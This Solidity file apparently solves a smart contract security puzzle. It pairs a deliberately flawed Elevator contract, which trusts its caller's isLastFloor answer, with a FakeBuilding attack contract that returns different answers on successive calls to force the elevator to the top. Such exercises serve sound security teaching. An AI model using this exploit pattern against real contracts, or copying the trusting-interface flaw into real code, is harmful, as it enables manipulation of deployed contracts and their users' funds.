// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}

contract FakeBuilding is Building {
    address public elevator;
    uint256 floor;

    constructor(address _elevator) {
        elevator = _elevator;
    }

    function attack() public {
        Elevator instance = Elevator(elevator);
        instance.goTo(10000000000000000000000);
    }

    function isLastFloor(uint256) external returns (bool) {
        floor += 1;
        return floor != 1;
    }
}
